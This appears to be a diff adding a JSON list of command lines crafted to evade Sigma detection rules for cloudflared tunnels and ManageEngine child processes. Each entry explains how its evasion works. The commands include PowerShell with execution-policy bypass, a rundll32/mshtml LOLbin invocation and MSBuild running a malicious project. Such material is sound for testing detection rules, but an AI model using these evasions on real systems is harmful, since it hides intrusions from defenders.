@@ -1,0 +1,30 @@
+[
+  {
+    "output": "cloudflared.exe tunnel run --token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "explanation": "The Sigma rule explicitly checks for the flags with a trailing space, such as '-token ' or '-config '. By using an equals sign to assign the value (e.g., '--token=' or '-config='), the exact string match fails and the second detection condition is bypassed."
+  },
+  {
+    "output": "cloudflared.exe \"tunnel\" \"run\" --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "explanation": "The rule requires the exact sub-strings ' tunnel ' and ' run ' with leading and trailing spaces. By wrapping the arguments in quotes, the raw command line logged by Windows process creation events will contain '\"tunnel\"' and '\"run\"', disrupting the space-padded string match requirement of the first condition."
+  },
+  {
+    "output": "cloudflared.exe --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... tunnel run",
+    "explanation": "The rule expects the string ' run ' with a trailing space. By placing the 'run' keyword at the absolute end of the command line string with no trailing arguments or whitespace, the matching condition for ' run ' evaluates to false."
+  },
+  {
+    "output": "cmd.exe /c \"set TUNNEL_TOKEN=eyJhbGci... && cloudflared.exe tunnel run\"",
+    "explanation": "Cloudflared supports reading credentials directly from environment variables (like TUNNEL_TOKEN) rather than requiring them on the command line. By setting the token in the environment and running cloudflared without the flagged arguments, the second selection block is completely bypassed."
+  },
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c powershell.exe -nop -ep bypass",
+    "explanation": "The rule monitors for specific binaries spawned directly by the ManageEngine Java process, but omits 'cmd.exe'. By spawning 'cmd.exe' first, any subsequent execution (like powershell.exe) will have 'cmd.exe' as its parent rather than 'java.exe', successfully breaking the ParentImage condition."
+  },
+  {
+    "output": "C:\\Windows\\System32\\rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();",
+    "explanation": "The rule explicitly comments out several frequently abused binaries such as 'rundll32.exe', 'regsvr32.exe', and 'scriptrunner.exe'. Directly executing these LOLbins as child processes of the ServiceDesk Java application will bypass this detection."
+  },
+  {
+    "output": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\path\\to\\malicious.xml",
+    "explanation": "The detection relies on a hardcoded list of expected malicious child processes. Utilizing alternative Living-off-the-Land Binaries (LOLbins) that are not included in the 'Image|endswith' list, such as MSBuild.exe or msiexec.exe, will evade the rule."
+  }
+]
